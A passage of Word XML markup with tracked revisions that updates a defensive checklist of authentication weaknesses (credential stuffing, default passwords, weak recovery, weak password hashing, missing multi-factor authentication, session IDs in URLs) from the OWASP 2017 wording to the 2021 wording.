          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Confirmation of the user's identity, authentication, and session</w:t>
      </w:r>
      <w:del w:id="2523" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="66EE0AFD" w14:textId="416BD146" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">management </w:t>
      </w:r>
      <w:del w:id="2524" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>are</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2525" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>is</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> critical to protect against authentication-related</w:t>
      </w:r>
      <w:del w:id="2526" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> attacks.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="60483B93" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00841D1E" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2527" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="2528" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923167"/>
      <w:moveTo w:id="2529" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>attacks.</w:t>
        </w:r>
      </w:moveTo>
      <w:moveToRangeEnd w:id="2528"/>
    </w:p>
    <w:p w14:paraId="5528673F" w14:textId="4E226BBD" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2530" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>There may be authentication weaknesses if the application:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A0DC5D7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D6B7670" w14:textId="710A3739" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2531" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2532" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2533" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Permits automated attacks such as </w:t>
      </w:r>
      <w:del w:id="2534" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>[</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>credential stuffing</w:t>
      </w:r>
      <w:del w:id="2535" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>](https://www.owasp.org/index.php/Credential_stuffing),</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2536" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>where</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EAB7C68" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2537" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> attacker has a list of valid usernames and passwords.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D073D5" w14:textId="2FF583BD" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2538" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2539" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6EF861E2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2540" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Permits brute force or other automated attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49CFFB16" w14:textId="78CBB137" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2541" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2542" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4AE048B1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2543" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2544" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Permits default, weak, or well-known passwords, such as "Password1"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19519601" w14:textId="395A76BA" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2545" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or "</w:t>
      </w:r>
      <w:ins w:id="2546" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>admin/</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>admin</w:t>
      </w:r>
      <w:del w:id="2547" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>/admin“.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2548" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>".</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="69F466D3" w14:textId="5E899F33" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2549" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2550" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="60198AE9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2551" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2552" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Uses weak or ineffective credential recovery and forgot-password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF2F9D1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2553" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2554" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> processes, such as "knowledge-based answers", which cannot be made</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A66935A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2555" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> safe.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C2FC807" w14:textId="60AD5B5D" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2556" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2557" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="40197056" w14:textId="7596F7F1" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2558" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Uses plain text, encrypted, or weakly hashed passwords </w:t>
      </w:r>
      <w:del w:id="2559" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>(see **A3:2017-Sensitive Data Exposure**).</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2560" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>data stores (see</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2AF76B22" w14:textId="3BB2CDBD" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2561" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2562" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2563" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    [A02:2021-Cryptographic </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Failures](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>A02_2021-Cryptographic_Failures.md)).</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="70D5D3A9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2564" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5625F234" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2565" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Has missing or ineffective multi-factor authentication.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C99FD1" w14:textId="558BA8CC" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2566" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2567" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3A04D01F" w14:textId="08433191" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2568" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Exposes </w:t>
      </w:r>
      <w:del w:id="2569" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Session IDs</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2570" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>session identifier</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the URL</w:t>
      </w:r>
      <w:del w:id="2571" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> (e.g., URL rewriting).</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2572" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
